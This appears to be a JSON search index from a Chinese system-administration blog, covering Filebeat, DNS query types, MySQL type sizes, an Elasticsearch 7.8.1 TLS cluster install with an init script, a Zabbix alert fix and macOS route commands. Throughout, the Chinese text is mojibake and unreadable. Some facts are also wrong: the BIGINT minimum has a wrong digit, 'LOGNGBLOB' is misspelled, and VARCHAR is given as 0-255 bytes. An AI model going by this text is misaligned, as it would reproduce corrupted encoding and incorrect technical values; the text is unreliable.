å¦‚æœinputç±»å‹æ˜¯logï¼Œåˆ™inputæŸ¥æ‰¾é©±åŠ¨å™¨ä¸Šä¸å·²å®šä¹‰çš„globè·¯å¾„åŒ¹é…çš„æ‰€æœ‰æ–‡ä»¶ï¼Œå¹¶ä¸ºæ¯ä¸ªæ–‡ä»¶å¯åŠ¨ä¸€ä¸ªharvesterã€‚ æ¯ä¸ªinputéƒ½åœ¨è‡ªå·±çš„Goä¾‹ç¨‹ä¸­è¿è¡Œã€‚ ä¸‹é¢çš„ä¾‹å­é…ç½®Filebeatä»æ‰€æœ‰åŒ¹é…æŒ‡å®šçš„globæ¨¡å¼çš„æ–‡ä»¶ä¸­è¯»å–è¡Œï¼š filebeat.inputs: - type: log paths: - /var/log/*.log - /var/path2/*.log ","date":"2021-03-17 10:28","objectID":"/post/2245/:1:2","tags":["elk","filebeat"],"title":"ELK-filebeatå®‰è£…å’Œç®€ä»‹(ä¸€)","uri":"/post/2245/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"3.Filebeatå¦‚ä½•ä¿æŒæ–‡ä»¶çŠ¶æ€ Filebeatä¿å­˜æ¯ä¸ªæ–‡ä»¶çš„çŠ¶æ€ï¼Œå¹¶ç»å¸¸åˆ·æ–°çŠ¶æ€åˆ°ç£ç›˜ä¸Šçš„æ³¨å†Œæ–‡ä»¶ï¼ˆregistryï¼‰ã€‚çŠ¶æ€ç”¨äºè®°ä½harvesterè¯»å–çš„æœ€åä¸€ä¸ªåç§»é‡ï¼Œå¹¶ç¡®ä¿æ‰€æœ‰æ—¥å¿—è¡Œè¢«å‘é€ï¼ˆåˆ°è¾“å‡ºï¼‰ã€‚å¦‚æœè¾“å‡ºï¼Œæ¯”å¦‚Elasticsearch æˆ–è€… Logstashç­‰ï¼Œæ— æ³•è®¿é—®ï¼Œé‚£ä¹ˆFilebeatä¼šè·Ÿè¸ªå·²ç»å‘é€çš„æœ€åä¸€è¡Œï¼Œå¹¶åªè¦è¾“å‡ºå†æ¬¡å˜å¾—å¯ç”¨æ—¶ç»§ç»­è¯»å–æ–‡ä»¶ã€‚å½“Filebeatè¿è¡Œæ—¶ï¼Œä¼šå°†æ¯ä¸ªæ–‡ä»¶çš„çŠ¶æ€æ–°ä¿å­˜åœ¨å†…å­˜ä¸­ã€‚å½“Filebeaté‡æ–°å¯åŠ¨æ—¶ï¼Œå°†ä½¿ç”¨æ³¨å†Œæ–‡ä»¶ä¸­çš„æ•°æ®é‡æ–°æ„å»ºçŠ¶æ€ï¼ŒFilebeatå°†åœ¨æœ€åä¸€ä¸ªå·²çŸ¥ä½ç½®ç»§ç»­æ¯ä¸ªharvesterã€‚ å¯¹äºæ¯ä¸ªè¾“å…¥ï¼ŒFilebeatä¿å­˜å®ƒæ‰¾åˆ°çš„æ¯ä¸ªæ–‡ä»¶çš„çŠ¶æ€ã€‚å› ä¸ºæ–‡ä»¶å¯ä»¥é‡å‘½åæˆ–ç§»åŠ¨ï¼Œæ‰€ä»¥æ–‡ä»¶åå’Œè·¯å¾„ä¸è¶³ä»¥æ ‡è¯†æ–‡ä»¶ã€‚å¯¹äºæ¯ä¸ªæ–‡ä»¶ï¼ŒFilebeatå­˜å‚¨æƒŸä¸€æ ‡è¯†ç¬¦ï¼Œä»¥æ£€æµ‹æ–‡ä»¶æ˜¯å¦ä»¥å‰è¯»å–è¿‡ã€‚ å¦‚æœä½ çš„æƒ…å†µæ¶‰åŠæ¯å¤©åˆ›å»ºå¤§é‡çš„æ–°æ–‡ä»¶ï¼Œä½ å¯èƒ½ä¼šå‘ç°æ³¨å†Œè¡¨æ–‡ä»¶å˜å¾—å¤ªå¤§äº†ã€‚ ï¼ˆç”»å¤–éŸ³ï¼šFilebeatä¿å­˜æ¯ä¸ªæ–‡ä»¶çš„çŠ¶æ€ï¼Œå¹¶å°†çŠ¶æ€ä¿å­˜åˆ°registry_fileä¸­çš„ç£ç›˜ã€‚å½“é‡æ–°å¯åŠ¨Filebeatæ—¶ï¼Œæ–‡ä»¶çŠ¶æ€ç”¨äºåœ¨ä»¥å‰çš„ä½ç½®ç»§ç»­è¯»å–æ–‡ä»¶ã€‚å¦‚æœæ¯å¤©ç”Ÿæˆå¤§é‡æ–°æ–‡ä»¶ï¼Œæ³¨å†Œè¡¨æ–‡ä»¶å¯èƒ½ä¼šå˜å¾—å¤ªå¤§ã€‚ä¸ºäº†å‡å°æ³¨å†Œè¡¨æ–‡ä»¶çš„å¤§å°ï¼Œæœ‰ä¸¤ä¸ªé…ç½®é€‰é¡¹å¯ç”¨ï¼šclean_removeå’Œclean_inactiveã€‚å¯¹äºä½ ä¸å†è®¿é—®ä¸”è¢«å¿½ç•¥çš„æ—§æ–‡ä»¶ï¼Œå»ºè®®æ‚¨ä½¿ç”¨clean_inactiveã€‚å¦‚æœæƒ³ä»ç£ç›˜ä¸Šåˆ é™¤æ—§æ–‡ä»¶ï¼Œé‚£ä¹ˆä½¿ç”¨clean_removeé€‰é¡¹ã€‚ï¼‰ ","date":"2021-03-17 10:28","objectID":"/post/2245/:1:3","tags":["elk","filebeat"],"title":"ELK-filebeatå®‰è£…å’Œç®€ä»‹(ä¸€)","uri":"/post/2245/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"4.Filebeatå¦‚ä½•ç¡®ä¿è‡³å°‘æŠ•é€’ä¸€æ¬¡ï¼ˆat-least-onceï¼‰ï¼Ÿ Filebeatä¿è¯äº‹ä»¶å°†è¢«æŠ•é€’åˆ°é…ç½®çš„è¾“å‡ºä¸­è‡³å°‘ä¸€æ¬¡ï¼Œå¹¶ä¸”ä¸ä¼šä¸¢å¤±æ•°æ®ã€‚Filebeatèƒ½å¤Ÿå®ç°è¿™ç§è¡Œä¸ºï¼Œå› ä¸ºå®ƒå°†æ¯ä¸ªäº‹ä»¶çš„æŠ•é€’çŠ¶æ€å­˜å‚¨åœ¨æ³¨å†Œè¡¨æ–‡ä»¶ä¸­ã€‚ åœ¨å®šä¹‰çš„è¾“å‡ºè¢«é˜»å¡ä¸”æ²¡æœ‰ç¡®è®¤æ‰€æœ‰äº‹ä»¶çš„æƒ…å†µä¸‹ï¼ŒFilebeatå°†ç»§ç»­å°è¯•å‘é€äº‹ä»¶ï¼Œç›´åˆ°è¾“å‡ºç¡®è®¤æ”¶åˆ°äº‹ä»¶ä¸ºæ­¢ã€‚ å¦‚æœFilebeatåœ¨å‘é€äº‹ä»¶çš„è¿‡ç¨‹ä¸­å…³é—­äº†ï¼Œåˆ™åœ¨å…³é—­ä¹‹å‰å®ƒä¸ä¼šç­‰å¾…è¾“å‡ºç¡®è®¤æ‰€æœ‰äº‹ä»¶ã€‚å½“Filebeaté‡æ–°å¯åŠ¨æ—¶ï¼Œå‘é€åˆ°è¾“å‡ºï¼ˆä½†åœ¨Filebeatå…³é—­å‰æœªç¡®è®¤ï¼‰çš„ä»»ä½•äº‹ä»¶å°†å†æ¬¡å‘é€ã€‚è¿™ç¡®ä¿æ¯ä¸ªäº‹ä»¶è‡³å°‘è¢«å‘é€ä¸€æ¬¡ï¼Œä½†æ˜¯ä½ æœ€ç»ˆå¯èƒ½ä¼šå°†é‡å¤çš„äº‹ä»¶å‘é€åˆ°è¾“å‡ºã€‚ä½ å¯ä»¥é€šè¿‡è®¾ç½®shutdown_timeouté€‰é¡¹ï¼Œå°†Filebeaté…ç½®ä¸ºåœ¨å…³é—­ä¹‹å‰ç­‰å¾…ç‰¹å®šçš„æ—¶é—´ã€‚ ","date":"2021-03-17 10:28","objectID":"/post/2245/:1:4","tags":["elk","filebeat"],"title":"ELK-filebeatå®‰è£…å’Œç®€ä»‹(ä¸€)","uri":"/post/2245/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"ä¸€ã€å››ç§ä¸åŒç±»å‹çš„åŸŸåæœåŠ¡å™¨ï¼š ","date":"2021-03-12 16:17","objectID":"/post/2237/:1:0","tags":["dns"],"title":"DNSé€’å½’æŸ¥è¯¢å’Œè¿­ä»£æŸ¥è¯¢","uri":"/post/2237/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"1. æ ¹åŸŸåæœåŠ¡å™¨ å…¨ä¸–ç•Œä¸€å…±æœ‰13å°ipv4æ ¹æœåŠ¡å™¨(13ä¸ªé›†ç¾¤)ï¼Œ25å°ipv6æ ¹æœåŠ¡å™¨ã€‚æ ¹åŸŸåæœåŠ¡å™¨ä¸€èˆ¬å°±è¿”å›åŸŸåæ‰€å±é¡¶çº§åŸŸçš„é¡¶çº§åŸŸæœåŠ¡å™¨çš„IPåœ°å€ã€‚ å­˜çš„è®°å½•æ¯”è¾ƒå°‘ï¼Œè®°å½•çš„æ˜¯comã€cnã€netã€orgè¿™ç§é¡¶çº§åŸŸæœåŠ¡å™¨çš„ipåœ°å€æˆ–å…¶ä»–è®°å½•ã€‚ ","date":"2021-03-12 16:17","objectID":"/post/2237/:1:1","tags":["dns"],"title":"DNSé€’å½’æŸ¥è¯¢å’Œè¿­ä»£æŸ¥è¯¢","uri":"/post/2237/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"2. é¡¶çº§åŸŸæœåŠ¡å™¨ è¿™ç§åŸŸåæœåŠ¡å™¨è´Ÿè´£ ç®¡ç† åœ¨è¯¥é¡¶çº§åŸŸåæœåŠ¡å™¨ä¸Šæ³¨å†Œçš„æ‰€æœ‰äºŒçº§åŸŸåã€‚å½“æ”¶åˆ°DNSæŸ¥è¯¢è¯·æ±‚æ—¶ï¼Œå°±ç»™å‡ºç›¸åº”çš„å›ç­”ï¼ˆå¯èƒ½æ˜¯æœ€åçš„ç»“æœï¼Œä¹Ÿå¯èƒ½æ˜¯ä¸‹ä¸€çº§æƒé™åŸŸåæœåŠ¡å™¨çš„åœ°å€ï¼‰ã€‚ ","date":"2021-03-12 16:17","objectID":"/post/2237/:1:2","tags":["dns"],"title":"DNSé€’å½’æŸ¥è¯¢å’Œè¿­ä»£æŸ¥è¯¢","uri":"/post/2237/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"3. æƒé™(æƒå¨)åŸŸåæœåŠ¡å™¨ äºŒçº§(jd.cn)ã€ä¸‰çº§(www.jd.cn)æˆ–æ›´å¤šçº§åˆ«çš„åŸŸåå¯ä»¥å½’ä¸ºæƒé™æœåŠ¡å™¨ã€‚ï¼ˆå¯èƒ½æ˜¯æœ€åçš„ç»“æœï¼Œä¹Ÿå¯èƒ½æ˜¯ä¸‹ä¸€çº§æƒé™åŸŸåæœåŠ¡å™¨çš„åœ°å€ï¼‰ã€‚ ","date":"2021-03-12 16:17","objectID":"/post/2237/:1:3","tags":["dns"],"title":"DNSé€’å½’æŸ¥è¯¢å’Œè¿­ä»£æŸ¥è¯¢","uri":"/post/2237/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"4. æœ¬åœ°åŸŸåæœåŠ¡å™¨ ä¸€èˆ¬å°±æ˜¯æœ¬åœ°é…ç½®çš„DNSåœ°å€ï¼Œå¯èƒ½æ˜¯è·¯ç”±å™¨çš„åœ°å€ï¼Œä¹Ÿå¯èƒ½æ˜¯ç½‘ç»œè¿è¥å•†æä¾›çš„DNSåœ°å€ ","date":"2021-03-12 16:17","objectID":"/post/2237/:1:4","tags":["dns"],"title":"DNSé€’å½’æŸ¥è¯¢å’Œè¿­ä»£æŸ¥è¯¢","uri":"/post/2237/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"äºŒã€é€’å½’æŸ¥è¯¢ ä¸€å±‚ä¸€å±‚çš„è¿›å»ï¼Œç„¶åä¸€å±‚ä¸€å±‚çš„å›æ¥ã€‚ å®¢æˆ·ç«¯--\u003eæœ¬åœ°åŸŸåæœåŠ¡å™¨--\u003eæ ¹åŸŸåæœåŠ¡å™¨--\u003eé¡¶çº§åŸŸåæœåŠ¡å™¨--\u003eæƒé™åŸŸåæœåŠ¡å™¨ â†“ å®¢æˆ·ç«¯\u003c--æœ¬åœ°åŸŸåæœåŠ¡å™¨\u003c--æ ¹åŸŸåæœåŠ¡å™¨\u003c--é¡¶çº§åŸŸåæœåŠ¡å™¨ 22192-ddhfwya1ijl.png ","date":"2021-03-12 16:17","objectID":"/post/2237/:2:0","tags":["dns"],"title":"DNSé€’å½’æŸ¥è¯¢å’Œè¿­ä»£æŸ¥è¯¢","uri":"/post/2237/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"ä¸‰ã€è¿­ä»£æŸ¥è¯¢ ä¸€æ¥ä¸€å›çš„æŸ¥è¯¢ã€‚ å®¢æˆ·ç«¯â€“\u003eæœ¬åœ°åŸŸåæœåŠ¡å™¨(è¿™é‡Œæ˜¯é€’å½’æŸ¥è¯¢) æœ¬åœ°åŸŸåæœåŠ¡å™¨â€“\u003eæ ¹åŸŸåæœåŠ¡å™¨(.)â€“\u003eå‘Šè¯‰æœ¬åœ°åŸŸåæœåŠ¡å™¨æ‰¾é¡¶çº§åŸŸåæœåŠ¡å™¨(.com) æœ¬åœ°åŸŸåæœåŠ¡å™¨â€“\u003eé¡¶çº§åŸŸåæœåŠ¡å™¨(.com)â€“\u003eå‘Šè¯‰æœ¬åœ°åŸŸåæœåŠ¡å™¨æ‰¾æƒé™åŸŸåæœåŠ¡å™¨(.abc.com) æœ¬åœ°åŸŸåæœåŠ¡å™¨â€“\u003eæƒé™åŸŸåæœåŠ¡å™¨(.abc.com)â€“\u003ey.abc.comå½’å±äº.abc.comæ‰€ç®¡ã€‚æ‰€ä»¥ç›´æ¥å‘Šè¯‰æœ¬åœ°åŸŸåæœåŠ¡å™¨æœ€ç»ˆç»“æœ 49054-jvu52euvwop.png ç¬¬ä¸€æ­¥ä¸­ä¸ºä½•ä½¿ç”¨é€’å½’æŸ¥è¯¢ï¼Ÿ å¦‚æœç¬¬ä¸€æ­¥ä½¿ç”¨è¿­ä»£æŸ¥è¯¢ï¼Œé‚£ä¹ˆåé¢çš„è¯·æ±‚éƒ½éœ€è¦è¯·æ±‚ä¸»æœº(å®¢æˆ·æœº)æ¥å‚ä¸å®Œæˆï¼Œè¿™æ ·ä¼šå¢å¤§è¯·æ±‚ä¸»æœºçš„å‹åŠ›ã€‚æ‰€ä»¥é€šå¸¸æƒ…å†µä¸‹è¯·æ±‚ä¸»æœºå’Œæœ¬åœ°åŸŸåæœåŠ¡å™¨æ˜¯ä½¿ç”¨é€’å½’æŸ¥è¯¢ã€‚ ","date":"2021-03-12 16:17","objectID":"/post/2237/:3:0","tags":["dns"],"title":"DNSé€’å½’æŸ¥è¯¢å’Œè¿­ä»£æŸ¥è¯¢","uri":"/post/2237/"},{"categories":["databases"],"content":"TINYINT 1 å­—èŠ‚ æœ‰ç¬¦å·: -128ï¼Œ127 æ— ç¬¦å·: 0ï¼Œ255 ","date":"2021-03-10 20:09","objectID":"/post/2789/:0:1","tags":["mysql"],"title":"mysql ä¸åŒç±»å‹çš„å¤§å°é™åˆ¶","uri":"/post/2789/"},{"categories":["databases"],"content":"SMALLINT 2 å­—èŠ‚ æœ‰ç¬¦å·: -32768ï¼Œ32767 æ— ç¬¦å·: 0ï¼Œ65535 ","date":"2021-03-10 20:09","objectID":"/post/2789/:0:2","tags":["mysql"],"title":"mysql ä¸åŒç±»å‹çš„å¤§å°é™åˆ¶","uri":"/post/2789/"},{"categories":["databases"],"content":"MEDIUMINT 3 å­—èŠ‚ æœ‰ç¬¦å·: -8388608ï¼Œ8388607 æ— ç¬¦å·: 0ï¼Œ16777215 ","date":"2021-03-10 20:09","objectID":"/post/2789/:0:3","tags":["mysql"],"title":"mysql ä¸åŒç±»å‹çš„å¤§å°é™åˆ¶","uri":"/post/2789/"},{"categories":["databases"],"content":"INTæˆ–INTEGER 4 å­—èŠ‚ æœ‰ç¬¦å·: -2147483648ï¼Œ2147483647 æ— ç¬¦å·: 0ï¼Œ4294967295 ","date":"2021-03-10 20:09","objectID":"/post/2789/:0:4","tags":["mysql"],"title":"mysql ä¸åŒç±»å‹çš„å¤§å°é™åˆ¶","uri":"/post/2789/"},{"categories":["databases"],"content":"BIGINT 8 å­—èŠ‚ æœ‰ç¬¦å·: -9233372036854775808ï¼Œ9223372036854775807 æ— ç¬¦å·: 0ï¼Œ18446744073709551615 ","date":"2021-03-10 20:09","objectID":"/post/2789/:0:5","tags":["mysql"],"title":"mysql ä¸åŒç±»å‹çš„å¤§å°é™åˆ¶","uri":"/post/2789/"},{"categories":["databases"],"content":"CHAR 0-255å­—èŠ‚ å®šé•¿å­—ç¬¦ä¸² ","date":"2021-03-10 20:09","objectID":"/post/2789/:0:6","tags":["mysql"],"title":"mysql ä¸åŒç±»å‹çš„å¤§å°é™åˆ¶","uri":"/post/2789/"},{"categories":["databases"],"content":"VARCHAR 0-255å­—èŠ‚ å˜é•¿å­—ç¬¦ä¸² ","date":"2021-03-10 20:09","objectID":"/post/2789/:0:7","tags":["mysql"],"title":"mysql ä¸åŒç±»å‹çš„å¤§å°é™åˆ¶","uri":"/post/2789/"},{"categories":["databases"],"content":"TINYBLOB 0-255å­—èŠ‚ ä¸è¶…è¿‡ 255 ä¸ªå­—ç¬¦çš„äºŒè¿›åˆ¶å­—ç¬¦ä¸² ","date":"2021-03-10 20:09","objectID":"/post/2789/:0:8","tags":["mysql"],"title":"mysql ä¸åŒç±»å‹çš„å¤§å°é™åˆ¶","uri":"/post/2789/"},{"categories":["databases"],"content":"TINYTEXT 0-255å­—èŠ‚ çŸ­æ–‡æœ¬å­—ç¬¦ä¸² ","date":"2021-03-10 20:09","objectID":"/post/2789/:0:9","tags":["mysql"],"title":"mysql ä¸åŒç±»å‹çš„å¤§å°é™åˆ¶","uri":"/post/2789/"},{"categories":["databases"],"content":"BLOB 0-65 535å­—èŠ‚ äºŒè¿›åˆ¶å½¢å¼çš„é•¿æ–‡æœ¬æ•°æ® ","date":"2021-03-10 20:09","objectID":"/post/2789/:0:10","tags":["mysql"],"title":"mysql ä¸åŒç±»å‹çš„å¤§å°é™åˆ¶","uri":"/post/2789/"},{"categories":["databases"],"content":"TEXT 0-65 535å­—èŠ‚ é•¿æ–‡æœ¬æ•°æ® ","date":"2021-03-10 20:09","objectID":"/post/2789/:0:11","tags":["mysql"],"title":"mysql ä¸åŒç±»å‹çš„å¤§å°é™åˆ¶","uri":"/post/2789/"},{"categories":["databases"],"content":"MEDIUMBLOB 0-16 777 215å­—èŠ‚ äºŒè¿›åˆ¶å½¢å¼çš„ä¸­ç­‰é•¿åº¦æ–‡æœ¬æ•°æ® ","date":"2021-03-10 20:09","objectID":"/post/2789/:0:12","tags":["mysql"],"title":"mysql ä¸åŒç±»å‹çš„å¤§å°é™åˆ¶","uri":"/post/2789/"},{"categories":["databases"],"content":"MEDIUMTEXT 0-16 777 215å­—èŠ‚ ä¸­ç­‰é•¿åº¦æ–‡æœ¬æ•°æ® ","date":"2021-03-10 20:09","objectID":"/post/2789/:0:13","tags":["mysql"],"title":"mysql ä¸åŒç±»å‹çš„å¤§å°é™åˆ¶","uri":"/post/2789/"},{"categories":["databases"],"content":"LOGNGBLOB 0-4 294 967 295å­—èŠ‚ äºŒè¿›åˆ¶å½¢å¼çš„æå¤§æ–‡æœ¬æ•°æ® ","date":"2021-03-10 20:09","objectID":"/post/2789/:0:14","tags":["mysql"],"title":"mysql ä¸åŒç±»å‹çš„å¤§å°é™åˆ¶","uri":"/post/2789/"},{"categories":["databases"],"content":"LONGTEXT 0-4 294 967 295å­—èŠ‚ æå¤§æ–‡æœ¬æ•°æ® ","date":"2021-03-10 20:09","objectID":"/post/2789/:0:15","tags":["mysql"],"title":"mysql ä¸åŒç±»å‹çš„å¤§å°é™åˆ¶","uri":"/post/2789/"},{"categories":["ç›‘æ§","ç³»ç»ŸæœåŠ¡","ELKæ—¥å¿—æ”¶é›†"],"content":"1.ä¸‹è½½äºŒè¿›åˆ¶åŒ… wget -O /server/packages/elasticsearch-7.8.1-linux-x86_64.tar.gz https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-7.8.1-linux-x86_64.tar.gz ","date":"2021-03-10 10:47","objectID":"/post/2423/:0:1","tags":["elasticsearch"],"title":"elasticsearch7.8.1é›†ç¾¤å®‰è£…å¹¶é…ç½®TLS+basicauthè®¤è¯","uri":"/post/2423/"},{"categories":["ç›‘æ§","ç³»ç»ŸæœåŠ¡","ELKæ—¥å¿—æ”¶é›†"],"content":"2.è§£å‹å®‰è£… tar xf elasticsearch-7.8.1-linux-x86_64.tar.gz -C /usr/local/ ","date":"2021-03-10 10:47","objectID":"/post/2423/:0:2","tags":["elasticsearch"],"title":"elasticsearch7.8.1é›†ç¾¤å®‰è£…å¹¶é…ç½®TLS+basicauthè®¤è¯","uri":"/post/2423/"},{"categories":["ç›‘æ§","ç³»ç»ŸæœåŠ¡","ELKæ—¥å¿—æ”¶é›†"],"content":"3.ä¼˜åŒ– vim /etc/sysctl.conf fs.file-max=655360 vm.max_map_count = 262144 é‡æ–°åŠ è½½é…ç½® sysctl -p vim /etc/security/limits.conf * soft nproc 20480 * hard nproc 20480 * soft nofile 65536 * hard nofile 65536 * soft memlock unlimited * hard memlock unlimited vim /etc/security/limits.d/20-nproc.conf * soft nproc 40960 root soft nproc unlimited ","date":"2021-03-10 10:47","objectID":"/post/2423/:0:3","tags":["elasticsearch"],"title":"elasticsearch7.8.1é›†ç¾¤å®‰è£…å¹¶é…ç½®TLS+basicauthè®¤è¯","uri":"/post/2423/"},{"categories":["ç›‘æ§","ç³»ç»ŸæœåŠ¡","ELKæ—¥å¿—æ”¶é›†"],"content":"4.ä¿®æ”¹esé…ç½® vim /usr/local/elasticsearch-7.8.1/config/elasticsearch.yml cluster.name: elk-cluster node.name: node-1 path.data: /data/es/ path.logs: /usr/local/elasticsearch-7.8.1/logs bootstrap.memory_lock: true network.host: 0.0.0.0 http.port: 9200 discovery.zen.minimum_master_nodes: 2 cluster.initial_master_nodes: [\"172.17.10.161:9300\"] discovery.zen.ping.unicast.hosts: [\"172.17.10.161:9300\",\"172.17.10.162:9300\",\"172.17.10.163:9300\"] xpack.security.enabled: true # é›†ç¾¤èŠ‚ç‚¹é—´é€šä¿¡åŠ å¯† xpack.security.transport.ssl.enabled: true xpack.security.transport.ssl.verification_mode: certificate xpack.security.transport.ssl.keystore.path: elastic-certificates.p12 xpack.security.transport.ssl.truststore.path: elastic-certificates.p12 # é…ç½®httpsåŠ å¯† xpack.security.http.ssl.enabled: true xpack.security.http.ssl.keystore.path: elastic-certificates.p12 xpack.security.http.ssl.truststore.path: elastic-certificates.p12 ","date":"2021-03-10 10:47","objectID":"/post/2423/:0:4","tags":["elasticsearch"],"title":"elasticsearch7.8.1é›†ç¾¤å®‰è£…å¹¶é…ç½®TLS+basicauthè®¤è¯","uri":"/post/2423/"},{"categories":["ç›‘æ§","ç³»ç»ŸæœåŠ¡","ELKæ—¥å¿—æ”¶é›†"],"content":"5.åˆ›å»ºç”¨æˆ·ã€esæ•°æ®ç›®å½• useradd elasticsearch chown -R elasticsearch.elasticsearch /usr/local/elasticsearch-7.8.1 mkdir /data/es -p chown -R elasticsearch.elasticsearch /data/es ","date":"2021-03-10 10:47","objectID":"/post/2423/:0:5","tags":["elasticsearch"],"title":"elasticsearch7.8.1é›†ç¾¤å®‰è£…å¹¶é…ç½®TLS+basicauthè®¤è¯","uri":"/post/2423/"},{"categories":["ç›‘æ§","ç³»ç»ŸæœåŠ¡","ELKæ—¥å¿—æ”¶é›†"],"content":"6.ç”Ÿæˆè¯ä¹¦ cd /usr/local/elasticsearch-7.8.1 bin/elasticsearch-certutil ca bin/elasticsearch-certutil cert --ca elastic-stack-ca.p12 # ä¿®æ”¹æƒé™ chown elasticsearch.elasticsearch elastic-*.p12 # æ‹·è´åˆ°é…ç½®æ–‡ä»¶ç›®å½• mv elastic-*.p12 config/ ","date":"2021-03-10 10:47","objectID":"/post/2423/:0:6","tags":["elasticsearch"],"title":"elasticsearch7.8.1é›†ç¾¤å®‰è£…å¹¶é…ç½®TLS+basicauthè®¤è¯","uri":"/post/2423/"},{"categories":["ç›‘æ§","ç³»ç»ŸæœåŠ¡","ELKæ—¥å¿—æ”¶é›†"],"content":"7.é…ç½®è¿æ¥esçš„å„ä¸ªè´¦æˆ·å¯†ç  bin/elasticsearch-setup-passwords interactive ","date":"2021-03-10 10:47","objectID":"/post/2423/:0:7","tags":["elasticsearch"],"title":"elasticsearch7.8.1é›†ç¾¤å®‰è£…å¹¶é…ç½®TLS+basicauthè®¤è¯","uri":"/post/2423/"},{"categories":["ç›‘æ§","ç³»ç»ŸæœåŠ¡","ELKæ—¥å¿—æ”¶é›†"],"content":"8.ç®€å•å¯åŠ¨è„šæœ¬ vim /etc/init.d/es #!/bin/bash #chkconfig: 35 90 90 ES_BIN=/usr/local/elasticsearch-7.8.1/bin/ function pid_is_exist(){ ps -ef | grep [e]lasticsearch | grep -v x-pack-ml \u003e /dev/null 2\u003e\u00261 return $? } function start(){ w=`whoami` [[ $w == \"elasticsearch\" ]] \u0026\u0026 $ES_BIN/elasticsearch -d || su - elasticsearch -c \"$ES_BIN/elasticsearch -d\" } function stop(){ pid_is_exist if [[ $? != 0 ]] then echo \"æœåŠ¡æœªå¯åŠ¨\" exit fi ps -ef | grep [e]lasticsearch | grep -v x-pack-ml | awk '{print $2}' | xargs kill pid_is_exist [[ $? == 0 ]] \u0026\u0026 echo åœæ­¢æˆåŠŸ || read -p åœæ­¢å¤±è´¥æ˜¯å¦,å¼ºåˆ¶åœæ­¢: isforce [[ $isforce == \"y\" ]] \u0026\u0026 ps -ef | grep [e]lasticsearch | grep -v x-pack-ml | awk '{print $2}' | xargs kill -9 } case $1 in start) start ;; stop) stop ;; restart) stop start ;; *) echo Usage: $0 \"start|stop|restart\" ;; esac æ·»åŠ æœåŠ¡å¼€æœºå¯åŠ¨ chkconfig --add es ","date":"2021-03-10 10:47","objectID":"/post/2423/:0:8","tags":["elasticsearch"],"title":"elasticsearch7.8.1é›†ç¾¤å®‰è£…å¹¶é…ç½®TLS+basicauthè®¤è¯","uri":"/post/2423/"},{"categories":["ç›‘æ§","ç³»ç»ŸæœåŠ¡","ELKæ—¥å¿—æ”¶é›†"],"content":"9.å¯åŠ¨æœåŠ¡ service es start ","date":"2021-03-10 10:47","objectID":"/post/2423/:0:9","tags":["elasticsearch"],"title":"elasticsearch7.8.1é›†ç¾¤å®‰è£…å¹¶é…ç½®TLS+basicauthè®¤è¯","uri":"/post/2423/"},{"categories":["ç›‘æ§","ç³»ç»ŸæœåŠ¡","ELKæ—¥å¿—æ”¶é›†"],"content":"10.å®‰è£…å…¶ä»–èŠ‚ç‚¹ ä¿®æ”¹ç¬¬å››æ­¥ä¸­çš„é…ç½®ä¿¡æ¯ ç¬¬å…­æ­¥ä¸éœ€è¦é‡æ–°ç”Ÿæˆï¼ŒæŠŠä¹‹å‰ç”Ÿæˆçš„è¯ä¹¦æ‹·è´åˆ°æ–°èŠ‚ç‚¹å³å¯ ç¬¬ä¸ƒæ­¥æ— éœ€æ‰§è¡Œ å…¶ä»–æ­¥éª¤ç›¸åŒ ","date":"2021-03-10 10:47","objectID":"/post/2423/:0:10","tags":["elasticsearch"],"title":"elasticsearch7.8.1é›†ç¾¤å®‰è£…å¹¶é…ç½®TLS+basicauthè®¤è¯","uri":"/post/2423/"},{"categories":["ç›‘æ§"],"content":"zabbixçŠ¶æ€ï¼š 99010-pukpeuwghok.png æ‰‹åŠ¨é€šè¿‡snmpwalkè·å–ï¼š 02202-v851ipc0ux.png æœåŠ¡å™¨çŠ¶æ€æ˜¯æ²¡é—®é¢˜çš„ï¼Œä¸çŸ¥é“æ˜¯ä»€ä¹ˆåŸå› å¯¼è‡´çš„ã€‚æœ€åå»iloæ§åˆ¶å°çœ‹æ—¥å¿—(Integrated Management Log)ï¼ŒæŠŠæ—¥å¿—æ¸…æ‰å°±æ²¡é—®é¢˜äº†ã€‚ ","date":"2021-03-09 15:29","objectID":"/post/2233/:0:0","tags":["zabbix"],"title":"zabbixç›‘æ§HP DL360 Gen10æœåŠ¡å™¨,å‘Šè­¦System status is in critical state","uri":"/post/2233/"},{"categories":["å…¶ä»–"],"content":"åŸæ–‡ï¼šhttp://www.huilog.com/?p=660 mac osxè™½ç„¶æ˜¯ç±»unixçš„ç³»ç»Ÿï¼Œé»˜è®¤ä¹Ÿæ˜¯bash shellï¼Œä½†æ˜¯ä¿®æ”¹macåœ°å€åŠç®¡ç†è·¯ç”±è¡¨è·Ÿlinuxè¿˜æ˜¯ä¸ä¸€æ ·ã€‚ ","date":"2021-03-05 17:45","objectID":"/post/2232/:0:0","tags":["mac","unix"],"title":"mac osxä¿®æ”¹macåœ°å€å’Œç®¡ç†è·¯ç”±è¡¨çš„æ–¹æ³•","uri":"/post/2232/"},{"categories":["å…¶ä»–"],"content":"ä¿®æ”¹macåœ°å€,é‡å¯åå¤±æ•ˆ sudo ifconfig en0 lladdr d0:67:e5:2e:07:f1 ","date":"2021-03-05 17:45","objectID":"/post/2232/:0:1","tags":["mac","unix"],"title":"mac osxä¿®æ”¹macåœ°å€å’Œç®¡ç†è·¯ç”±è¡¨çš„æ–¹æ³•","uri":"/post/2232/"},{"categories":["å…¶ä»–"],"content":"æŸ¥çœ‹è·¯ç”±è¡¨ netstat -nr ","date":"2021-03-05 17:45","objectID":"/post/2232/:0:2","tags":["mac","unix"],"title":"mac osxä¿®æ”¹macåœ°å€å’Œç®¡ç†è·¯ç”±è¡¨çš„æ–¹æ³•","uri":"/post/2232/"},{"categories":["å…¶ä»–"],"content":"ä¿®æ”¹è·¯ç”±è¡¨ sudo route delete 0.0.0.0 åˆ é™¤é»˜è®¤è·¯ç”± sudo route add -net 0.0.0.0 192.168.1.1 é»˜è®¤ä½¿ç”¨192.168.1.1ç½‘å…³ sudo route add 10.0.1.0/24 10.200.22.254 